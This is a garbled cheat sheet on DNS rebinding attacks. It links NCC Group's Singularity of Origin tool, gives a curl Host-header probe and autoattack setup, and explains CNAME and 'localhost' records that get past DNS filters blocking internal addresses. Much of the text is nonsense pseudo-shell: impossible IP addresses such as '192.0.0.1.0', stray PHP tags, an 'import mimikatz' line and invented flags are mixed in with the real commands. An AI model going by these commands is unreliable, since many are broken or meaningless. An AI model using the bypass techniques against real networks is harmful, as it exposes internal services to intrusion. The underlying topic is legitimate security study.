$ --bind 192.0.0.1.0 * --attc m a c h i n e [n a m e]
$["TARGE","APP"]::--pass
$ 0auth
$ browser <?php request***response ?> --read
[same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) 
# Summary
* [Tools](#tools)
* [Exploitation](#exploitation)
* [Protection Bypasses](#protection-bypasses)
# Tools
- [Singularity of Origin](https://github.com/nccgroup/singularity) - is a tool to perform DNS rebinding attacks.
- [Singularity of Origin Web Client](http://rebind.it/) (manager interface, port scanner and autoattack)
# Exploitation
$ ["TARGET", "SRVC"] *vuln -bind
$ curl --header 'Host: <arbitrary-hostname>' http://<vulnerable-service>:8080 
$&& if localHOST:8080===loaded/web/page/srvc --result --vuln
$&& if localHOST:8080===ERROR"404" --result NUL
$ xxx.com [Setup Singularity of Origin](https://github.com/nccgroup/singularity/wiki/Setup-and-Installation) --mod [autoattack HTML page](https://github.com/nccgroup/singularity/blob/master/html/autoattack.html) for GNU/GCC 
$ Browser "http://rebinder.your.domain:8080/autoattack.html".
loading...`
# Protection Bypasses
$ localHOST:8080 --imp <?php &&**block --response?> --docker --para 192.0.0.0.1 <?php RESPONSE FROM int.xxx.com?> [!]BLOCKED 10.0.0.0/8[+]RFC.1918
>>>import mimikatz (127.0.0.0/8) local (internal) network or 0.0.0.0/0 network ranges...["BLOCKED"]
$ enable DNS.prot (NCC_DISABLED_DEFAULT).doc ["DNS","PROTECT","XPLOIT"]||(https://github.com/nccgroup/singularity/wiki/Protection-Bypasses)
$ 0.0.0.0 localhost (127.0.0.1) 
$ 0auth --filter blocking DNS responses containing 127.0.0.1 or 127.0.0.0/8...
# CNAME
$ CNAME.rec/DNS \0auth \block \all return *localhost --rule --filter ["INTERNA","ADDRESS"] 
[!]RESOLVED.C.NAME 
$ dig cname.example.com +noall +answer
; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer
;; global options: +cmd
cname.example.com.            381     IN      CNAME   target.local.
# localhost
We can use "localhost" as a DNS CNAME record to bypass filters blocking DNS responses containing 127.0.0.1.
$ dig www.example.com +noall +answer
; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer
;; global options: +cmd
localhost.example.com.            381     IN      CNAME   localhost.
# References
- [How Do DNS Rebinding Attacks Work? - nccgroup, 2019](https://github.com/nccgroup/singularity/wiki/How-Do-DNS-Rebinding-Attacks-Work%3F)
